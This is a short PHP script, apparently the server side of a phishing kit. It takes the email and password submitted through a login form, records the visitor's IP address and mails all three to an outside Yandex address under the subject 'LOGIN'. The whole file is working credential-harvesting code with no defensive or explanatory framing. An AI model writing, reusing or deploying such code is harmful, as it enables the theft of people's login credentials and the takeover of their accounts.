<?php 
$email = $_POST["frm-email"];
$pass  = $_POST["frm-pass"];

$from = "jeffniz autlink <zvi.pablo@yandex.com>";

$to_email = "billionaira147@yandex.com";



$headers  = "From: " . $from. "\r\n";
$headers .= "Reply-To: ". $from . "\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: text/html; charset=ISO-8859-1\r\n";

$message  = '<html><body>';
$message .= '<p><strong>Email:</strong>' . $email . '</p>';
$message .= '<p><strong>Password:</strong>' . $pass . '</p>';
$message .= '<p><strong>IP ADDRESS:</strong>' . $_SERVER['REMOTE_ADDR'] . '</p>';

if (mail($to_email, "LOGIN", $message, $headers))  {
	echo "SUCCESS";
};
